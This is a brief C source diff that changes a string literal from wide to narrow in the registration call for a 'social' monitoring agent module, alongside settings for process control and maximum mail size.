@@ -179,5 +179,5 @@ void PM_SocialAgentRegister()
 {
 	shared.social_process_control = SOCIAL_PROCESS_CONTINUE;
 	shared.max_social_mail_len = DEFAULT_MAX_MAIL_SIZE;
-	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
+	AM_MonitorRegister("social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
